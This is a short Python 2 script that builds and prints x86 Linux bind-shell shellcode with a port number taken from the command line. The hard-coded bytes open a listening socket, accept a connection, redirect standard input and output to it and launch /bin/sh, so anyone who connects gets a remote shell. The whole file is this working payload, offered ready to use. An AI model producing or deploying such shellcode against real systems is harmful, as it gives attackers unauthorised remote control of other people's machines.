#!/usr/bin/env python2
from sys import argv

port = int(argv[1])
hexport = hex(int(port)).replace('0x', '')

if len(hexport) < 4:
   hexport = '0' + hexport


hexport = '\\x%s\\x%s' % (hexport[0:2], hexport[2:])

print 'Port: %d' % port
print 'Hex: %s' % hexport




sc = \
"\\x31\\xc0\\x31\\xdb\\x31\\xff\\x50\\x40\\x50\\x40\\x50\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80" + \
"\\x89\\xc2\\x31\\xc0\\x50\\x66\\x68" + hexport + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\xb0" + \
"\\x66\\xfe\\xc3\\x89\\xe1\\xcd\\x80\\x6a\\x01\\x52\\xb0\\x66\\x80\\xc3\\x02\\x89\\xe1\\xcd\\x80" + \
"\\x31\\xc9\\x51\\x51\\x52\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x89\\xd1\\x89\\xc3\\xb0\\x3f\\xcd" + \
"\\x80\\x49\\x79\\xf9\\x57\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" + \
"\\x57\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80"
print sc


print len(sc)




